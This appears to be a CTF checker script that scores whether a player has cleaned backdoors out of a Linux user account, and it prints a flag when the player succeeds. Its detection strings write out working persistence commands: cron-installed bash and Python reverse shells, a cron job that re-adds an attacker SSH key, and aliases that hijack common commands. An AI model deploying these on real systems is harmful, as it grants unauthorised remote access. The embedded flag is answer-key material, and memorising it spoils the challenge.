#!/usr/bin/python3

import os

# Check some files
def checkFiles():
	if not( os.path.exists("/home/ctf/.ssh/") \
	and os.path.exists("/home/ctf/.bashrc") \
	and os.path.exists("/home/ctf/.bash_logout") \
	and os.path.exists("/home/ctf/.bash_logout") ):
		print("Deleting files at random is not the way to go!")
		exit()

# Check auth keys
def sshKey():

	if not os.path.exists("/home/ctf/.ssh/authorized_keys"):
		return 1
	key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDniDrOOLI8g9Gopo0TyAKcC9v4CL3I6Ly5lJGtj9MgpCh9Dmv5I1+63/FMH0fFFxSxG6j8aQft53771xsIrvykOKaPnKAdcNKmpxucDQ8CLSp9/brTmduzb3WsCyluyEOf8D0I8FHE2IUJ6AjyhDrnRclnJ4+54AWlE2mpsEszmV0ZXrK1ewHR0Zz5bGA7sqe9aM6Lds04F/AFs1Hb9PNwkv/2YlM3GixPBg3JaXuJYjI1oI4Atxw7ivrmqKNiUvHmKKiuTyhsSTU/Y7UgkNcx9h7mGiitXQsQn8+KJRSkihW2jf1pcncy2BULcyz57VutV99ESDyKTMAfMuiVBKgeoHRkUwWLcGR5cP2tUpIofPTT8CoSim83mTnYEDCtGkvdii6kCvxPevedUa0dTRPuN0ZWxbWIFBYpxBRdmszdpyA5qgKwBXSCWcGAdZL4WMf9f9Ilc0/6Eys9ULpXiryEY4qhPBa3mtOKnCPoCxxdgQAyHFj+4R5A8/vzUrYxoWM= chahine@deathstar"
	
	if key not in open("/home/ctf/.ssh/authorized_keys").read():
		return 1

	return 0

# Check cron
def cron():
	if not os.path.exists("/var/spool/cron/crontabs/ctf"):return 1
	for line in open("/var/spool/cron/crontabs/ctf"):
		if not (line.startswith("#") or line.strip()==""):
			return 0
	return 1

def bashrc():

	if not os.path.exists("/home/ctf/.bashrc"):
		return 0
	black = ["set -f", "alias cat=/home/ctf/.backdo0r/cat.py","alias find=/home/ctf/.backdo0r/find.py","alias ls=/home/ctf/.backdo0r/ls.py","alias which=/home/ctf/.backdo0r/which.py","cat /etc/inputrc  > ~/.inputrc","echo \"set disable-completion on\" >> ~/.inputrc","crontab -l|sed \"\$a* * * * * nohup bash -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1' >/dev/null 2>&1 &\"|crontab -","crontab -l|sed \"\$a* * * * * echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDniDrOOLI8g9Gopo0TyAKcC9v4CL3I6Ly5lJGtj9MgpCh9Dmv5I1+63/FMH0fFFxSxG6j8aQft53771xsIrvykOKaPnKAdcNKmpxucDQ8CLSp9/brTmduzb3WsCyluyEOf8D0I8FHE2IUJ6AjyhDrnRclnJ4+54AWlE2mpsEszmV0ZXrK1ewHR0Zz5bGA7sqe9aM6Lds04F/AFs1Hb9PNwkv/2YlM3GixPBg3JaXuJYjI1oI4Atxw7ivrmqKNiUvHmKKiuTyhsSTU/Y7UgkNcx9h7mGiitXQsQn8+KJRSkihW2jf1pcncy2BULcyz57VutV99ESDyKTMAfMuiVBKgeoHRkUwWLcGR5cP2tUpIofPTT8CoSim83mTnYEDCtGkvdii6kCvxPevedUa0dTRPuN0ZWxbWIFBYpxBRdmszdpyA5qgKwBXSCWcGAdZL4WMf9f9Ilc0/6Eys9ULpXiryEY4qhPBa3mtOKnCPoCxxdgQAyHFj+4R5A8/vzUrYxoWM= chahine@deathstar' >> /home/ctf/.ssh/authorized_keys\"|crontab -","alias sh=bash","alias unalias=\"\"","alias alias=\"\""]
	for line in open("/home/ctf/.bashrc").read().splitlines():
		if any([b in line for b in black]) and not line.startswith("#"):
			return 0
	return 1
def bash_logout():
	for line in open("/home/ctf/.bash_logout").read().splitlines():
		if "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.2.99\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" \
		in line and not line.startswith("#"):
			return 0
	return 1



def backdoor():
	if os.path.exists("/home/ctf/.backdo0r"):
		return 0
	else:
		return 1


checkFiles()
score = sshKey() + cron() + backdoor() + bashrc() + bash_logout()
print("Score: {i}/5".format(i=score))
if score == 5:
	print("shellmates{C4lL_m3_B4Ckd00r_C!e4n3rrrrr}")